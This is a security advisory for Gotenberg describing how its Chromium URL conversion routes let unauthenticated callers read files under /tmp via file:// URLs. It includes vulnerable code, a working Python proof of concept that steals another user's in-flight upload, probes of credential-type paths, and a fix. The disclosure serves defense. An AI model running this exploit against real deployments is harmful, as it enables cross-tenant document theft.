# [M] Gotenberg allows Chromium URL conversion routes to read arbitrary files under /tmp via file:// scheme

## Summary
Severity: Medium
Advisory: GHSA-g924-cjx7-2rjw
CVE: CVE-2026-42597
CWE: CWE-73, CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-g924-cjx7-2rjw
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.32.0
- Go: `github.com/gotenberg/gotenberg/v7` — affected >=0

## Details
## Summary

The `/forms/chromium/convert/url` and `/forms/chromium/screenshot/url` routes accept `url=file:///tmp/...` from anonymous callers. The default Chromium deny-list intentionally exempts `file:///tmp/` so HTML/Markdown routes can load their own request-local assets, and those routes apply a per-request `AllowedFilePrefixes` guard to scope the read. The URL routes never set `AllowedFilePrefixes`, so the scope guard silently skips. Alice enumerates `/tmp/`, walks Gotenberg's per-request working directories, and reads the raw source files of other in-flight conversions as rendered PDF output.

## Details

The default deny-list regex at `pkg/modules/chromium/chromium.go:449` uses a negative lookahead to exempt `/tmp/`:

```go
fs.StringSlice("chromium-deny-list",
    []string{`^file:(?!//\/tmp/).*`},
    "Set the denied URLs for Chromium using regular expressions - supports multiple values")
```

`pkg/gotenberg/outbound.go:185-187` short-circuits IP validation for non-HTTP schemes:

```go
if !httpLikeScheme(parsed.Scheme) {
    return outboundDecision{}, nil
}
```

So any `file:///tmp/...` URL passes `FilterOutboundURL` cleanly.

The HTML route pairs the exemption with a per-request scope guard (`pkg/modules/chromium/routes.go:518`):

```go
options.AllowedFilePrefixes = []string{ctx.DirPath()}
```

and the CDP `Fetch.requestPaused` handler enforces the scope (`pkg/modules/chromium/events.go:65-78`):

```go
if allow && strings.HasPrefix(e.Request.URL, "file://") && len(options.allowedFilePrefixes) > 0 {
    prefixMatch := false
    for _, prefix := range options.allowedFilePrefixes {
        if strings.HasPrefix(e.Request.URL, "file://"+prefix) {
            prefixMatch = true
            break
        }
    }
    if !prefixMatch {
        allow = false
    }
}
```

The `len(options.allowedFilePrefixes) > 0` condition skips the entire enforcement block when the slice is empty. The URL route handler at `pkg/modules/chromium/routes.go:406-448` (`convertUrlRoute`) never populates `AllowedFilePrefixes`. `MandatoryString("url", &url)` takes the form value without scheme validation and passes it to `convertUrl` → `chromium.Pdf` → Chromium navigation.

Gotenberg stores uploaded request assets at `/tmp/<gotenberg-work-uuid>/<request-uuid>/<file-uuid>.<ext>` (`pkg/gotenberg/fs.go:64-65`). Chromium renders the targeted `file://` URL as a PDF and the response body returns to the caller.

## Proof of Concept

Reproduction uses the stock Docker image with no auth:

```bash
docker run -d --name gotenberg-poc -p 3000:3000 gotenberg/gotenberg:8
```

Python script. Alice attacks, Bob runs a slow legitimate conversion whose request directory stays alive long enough for Alice to locate it. `waitDelay=15s` stands in for any naturally slow convert (large DOCX, multi-page HTML with external fetches, LibreOffice rendering a complex spreadsheet):

```python
import requests, threading, time, subprocess, re
TARGET = "http://localhost:3000"
SECRET = f"BOB-CROSS-REQ-LEAK-{int(time.time())}"

bob_html = f"<html><body><h1>{SECRET}</h1></body></html>".encode()

def bob_runs():
    requests.post(
        f"{TARGET}/forms/chromium/convert/html",
        files={"files": ("index.html", bob_html, "text/html")},
        data={"waitDelay": "15s"},
        timeout=60,
    )

def alice_reads(url):
    r = requests.post(
        f"{TARGET}/forms/chromium/convert/url",
        files={"url": (None, url)}, timeout=30,
    )
    if r.status_code != 200: return None
    open("/tmp/_alice.pdf", "wb").write(r.content)
    return subprocess.run(
        ["pdftotext", "/tmp/_alice.pdf", "-"],
        capture_output=True, text=True,
    ).stdout

threading.Thread(target=bob_runs, daemon=True).start()
time.sleep(2)

# Step 1: list /tmp/ to discover the gotenberg work UUID
tmp = alice_reads("file:///tmp/")
work = re.search(r"([0-9a-f-]{36})", tmp).group(1)

# Step 2: walk into the work dir to find an in-flight request dir
wd = alice_reads(f"file:///tmp/{work}/")
for req in re.findall(r"([0-9a-f-]{36})", wd):
    if req == work: continue
    rd = alice_reads(f"file:///tmp/{work}/{req}/")
    if rd and (m := re.search(r"([0-9a-f-]{36}\.html)", rd)):
        # Step 3: read bob's uploaded HTML
        txt = alice_reads(f"file:///tmp/{work}/{req}/{m.group(1)}")
        print("SECRET recovered:", SECRET in txt)
        break

# Sanity: /etc/passwd stays blocked (deny-list holds outside /tmp)
r = requests.post(f"{TARGET}/forms/chromium/convert/url",
    files={"url": (None, "file:///etc/passwd")}, timeout=30)
print(f"/etc/passwd probe: HTTP {r.status_code}")  # 403 Forbidden
```

Output against gotenberg 8.31.0:

```
SECRET recovered: True
/etc/passwd probe: HTTP 403
```

`file:///tmp/` directory enumeration works on every request, unconditionally. Cross-request content read depends on timing: Alice needs the victim's request dir alive when she walks to it. Long-running legitimate conversions (large inputs, external HTTP fetches, explicit `waitDelay`) widen the window from milliseconds to seconds.

## Impact

An unauthenticated caller enumerates `/tmp/` on the Gotenberg host and reads the raw source files of other users' conversion requests while those requests are in flight. Content types include uploaded HTML, Markdown, Office documents awaiting LibreOffice conversion, and output PDFs staged for webhook delivery. The rendered file returns to the attacker as a PDF. In a multi-tenant deployment where multiple users submit documents to the same Gotenberg instance, cross-tenant document exfiltration is possible whenever the attacker wins the timing race against a victim's request lifecycle. Directory enumeration itself (the work-UUID and per-request-UUID structure) is available regardless of timing.

The deny-list regex holds for paths outside `/tmp/`. `file:///etc/passwd`, `file:///proc/self/environ`, and similar targets return HTTP 403. The primitive is scoped to `/tmp/`, not arbitrary filesystem read.

## Recommended Fix

Remove the `len(options.allowedFilePrefixes) > 0` condition at `pkg/modules/chromium/events.go:65` so URL routes block every `file://` sub-resource by default:

```go
if allow && strings.HasPrefix(e.Request.URL, "file://") {
    if len(options.allowedFilePrefixes) == 0 {
        allow = false
    } else {
        prefixMatch := false
        for _, prefix := range options.allowedFilePrefixes {
            if strings.HasPrefix(e.Request.URL, "file://"+prefix) {
                prefixMatch = true
                break
            }
        }
        if !prefixMatch {
            allow = false
        }
    }
}
```

Equivalent alternative: reject non-`http`/`https` schemes in the URL route handlers (`convertUrlRoute`, `screenshotUrlRoute`) before handing the URL to Chromium.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-g924-cjx7-2rjw
- https://nvd.nist.gov/vuln/detail/CVE-2026-42597
- https://github.com/gotenberg/gotenberg
